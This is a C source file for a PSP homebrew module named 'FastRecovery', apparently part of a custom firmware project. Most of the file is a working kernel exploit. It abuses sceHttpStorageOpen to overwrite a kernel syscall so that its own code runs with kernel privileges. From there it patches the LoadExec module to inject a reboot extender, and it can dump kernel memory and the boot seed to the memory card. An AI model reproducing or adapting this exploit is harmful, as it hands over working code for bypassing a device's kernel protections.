#include <pspdebug.h>
#include <pspctrl.h>
#include <pspsdk.h>
#include <pspiofilemgr.h>
#include <psputility.h>
#include <psputility_htmlviewer.h>
#include <psploadexec.h>
#include <psputils.h>
#include <psputilsforkernel.h>
#include <pspsysmem.h>
#include <psppower.h>
#include <string.h>
#include "utils.h"
#include "printk.h"
#include "rebootex_conf.h"
#include "../Rebootex_bin/rebootex.h"
#include "../PXE/Launcher/launcher_patch_offset.h"

PSP_MODULE_INFO("FastRecovery", PSP_MODULE_USER, 1, 0);
PSP_MAIN_THREAD_ATTR(PSP_THREAD_ATTR_USER | PSP_THREAD_ATTR_VFPU);
PSP_HEAP_SIZE_KB(0);

/**
 * Taken from M33 SDK.
 * Describes a Module Structure from the chained Module List.
 */
typedef struct SceModule2
{
	struct SceModule2 * next; // 0
	unsigned short attribute; // 4
	unsigned char version[2]; // 6
	char modname[27]; // 8
	char terminal; // 0x23
	char mod_state;  // 0x24
	char unk1;    // 0x25
	char unk2[2]; // 0x26
	unsigned int unk3; // 0x28
	SceUID modid; // 0x2C
	unsigned int unk4; // 0x30
	SceUID mem_id; // 0x34
	unsigned int mpid_text;  // 0x38
	unsigned int mpid_data; // 0x3C
	void * ent_top; // 0x40
	unsigned int ent_size; // 0x44
	void * stub_top; // 0x48
	unsigned int stub_size; // 0x4C
	unsigned int entry_addr_; // 0x50
	unsigned int unk5[4]; // 0x54
	unsigned int entry_addr; // 0x64
	unsigned int gp_value; // 0x68
	unsigned int text_addr; // 0x6C
	unsigned int text_size; // 0x70
	unsigned int data_size;  // 0x74
	unsigned int bss_size; // 0x78
	unsigned int nsegment; // 0x7C
	unsigned int segmentaddr[4]; // 0x80
	unsigned int segmentsize[4]; // 0x90
} SceModule2;

int psp_model = 0;
u32 psp_fw_version = 0;

int dump_kmem = 0;

//load reboot function
int (* LoadReboot)(void * arg1, unsigned int arg2, void * arg3, unsigned int arg4) = NULL;

extern int sceHttpStorageOpen(int a0, int a1, int a2);
extern int sceKernelPowerLock(unsigned int, unsigned int);

void build_rebootex_configure(void)
{
	rebootex_config *conf = (rebootex_config *)(REBOOTEX_CONFIG);

	conf->magic = REBOOTEX_CONFIG_MAGIC;
	conf->psp_model = psp_model;
	conf->rebootex_size = size_rebootex;
	conf->psp_fw_version = psp_fw_version;
}

//load reboot wrapper
int _LoadReboot(void * arg1, unsigned int arg2, void * arg3, unsigned int arg4)
{
	//copy reboot extender
	memcpy((char *)REBOOTEX_START, rebootex, size_rebootex);

	//reset reboot flags
	memset((char *)REBOOTEX_CONFIG, 0, 0x100);
	memset((char *)REBOOTEX_CONFIG_ISO_PATH, 0, 256);

	build_rebootex_configure();

	//forward
	return LoadReboot(arg1, arg2, arg3, arg4);
}

void recovery_sysmem()
{
	_sw(0x3C058801, g_offs->sceKernelPowerLockForUser); // lui $a1, 0x8801
}

int kernel_permission_call(void)
{
	struct sceLoadExecPatch *patch;
	
	//cache invalidation functions
	void (* _sceKernelIcacheInvalidateAll)(void) = (void *)g_offs->sceKernelIcacheInvalidateAll;
	void (* _sceKernelDcacheWritebackInvalidateAll)(void) = (void *)g_offs->sceKernelDcacheWritebackInvalidateAll;

	recovery_sysmem();

	//sync cache
	_sceKernelIcacheInvalidateAll();
	_sceKernelDcacheWritebackInvalidateAll();

	//LoadCoreForKernel_EF8A0BEA
	SceModule2 * (* _sceKernelFindModuleByName)(const char * libname) = (void *)g_offs->sceKernelFindModuleByName;

	//find LoadExec module
	SceModule2 * loadexec = _sceKernelFindModuleByName("sceLoadExec");

	//SysMemForKernel_458A70B5
	int (* _sceKernelGetModel)(void) = (void *)g_offs->sceKernelGetModel;

	psp_model = _sceKernelGetModel();

	if(psp_model == PSP_GO) {
		patch = &g_offs->loadexec_patch_05g;
	} else {
		patch = &g_offs->loadexec_patch_other;
	}
	
	//replace LoadReboot function
	_sw(MAKE_CALL(_LoadReboot), loadexec->text_addr + patch->LoadRebootCall);

	//patch Rebootex position to 0x88FC0000
	_sw(0x3C0188FC, loadexec->text_addr + patch->RebootJump); // lui $at, 0x88FC

	//save LoadReboot function
	LoadReboot = (void*)loadexec->text_addr + patch->LoadReboot;
	
	if (dump_kmem) {
		memcpy((void*)0x08A00000, (void*)0x88000000, 0x400000);
		memcpy((void*)(0x08A00000+0x400000), (void*)0xBFC00200, 0x100);
	}

	//sync cache
	_sceKernelIcacheInvalidateAll();
	_sceKernelDcacheWritebackInvalidateAll();

	//return success
	return 0xC01DB15D;
}

void input_dump_kmem(void)
{
	SceCtrlData ctl;
	sceCtrlReadBufferPositive(&ctl, 1);

	if (ctl.Buttons & PSP_CTRL_LTRIGGER) {
		dump_kmem = 1;
		pspDebugScreenPrintf("Kernel memory will be dumped into ms0:/KMEM.BIN and ms0:/SEED.BIN\r\n");
	}
}

void do_exploit(void)
{
	u32 kernel_entry, entry_addr;
	u32 interrupts;
	u32 i;

	for(i=1; i<=6; ++i) {
		sceUtilityLoadModule(i + 0xFF);
	}

	sceHttpStorageOpen(-612, 0, 0);
	sync_cache();
	sceHttpStorageOpen((g_offs->sceKernelPowerLockForUser>>2), 0, 0); // scePowerLock override
	sync_cache();

	interrupts = pspSdkDisableInterrupts();
	kernel_entry = (u32) &kernel_permission_call;
	entry_addr = ((u32) &kernel_entry) - 16;
	sceKernelPowerLock(0, ((u32) &entry_addr) - g_offs->sceKernelPowerLockForUser_data_offset);
	pspSdkEnableInterrupts(interrupts);

	for(i=6; i>=1; --i) {
		sceUtilityUnloadModule(i + 0xFF);
	}
}

//entry point
int main(int argc, char * argv[])
{
	psp_fw_version = sceKernelDevkitVersion();
	setup_patch_offset_table(psp_fw_version);

	printk_init("ms0:/fastrecovery.txt");
	printk("Hello exploit\r\n");
	pspDebugScreenInit();

	input_dump_kmem();

	do_exploit();

	if ( dump_kmem ) {
		SceUID fd;

		fd = sceIoOpen("ms0:/kmem.bin", PSP_O_WRONLY | PSP_O_CREAT | PSP_O_TRUNC, 0777);

		if (fd >= 0) {
			sceIoWrite(fd, (void*)0x08A00000, 0x400000);
			sceIoClose(fd);
		}

		fd = sceIoOpen("ms0:/seed.bin", PSP_O_WRONLY | PSP_O_CREAT | PSP_O_TRUNC, 0777);

		if (fd >= 0) {
			sceIoWrite(fd, (void*)(0x08A00000+0x400000), 0x100);
			sceIoClose(fd);
		}
	}

	//trigger reboot
	sceKernelExitGame();

	//kill thread
	sceKernelExitDeleteThread(0);

	//return
	return 0;
}

//exit point
int module_stop(SceSize args, void * argp)
{
	//return
	return 0;
}
